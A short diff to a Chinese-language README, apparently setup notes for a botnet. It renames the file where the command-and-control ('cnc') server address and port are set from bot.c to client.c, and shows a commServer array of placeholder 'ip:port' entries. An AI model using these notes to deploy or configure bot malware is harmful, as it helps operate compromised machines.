@@ -26,9 +26,9 @@ screen -ls
 然后
 screen -r 会话名
 ```
-## 更换bot.c的cnc 地址和端口
+## 更换client.c的cnc 地址和端口
 ```c
-bot.c:
+client.c:
 
 
 unsigned char *commServer[] = {"ip:port", "ip:port"};
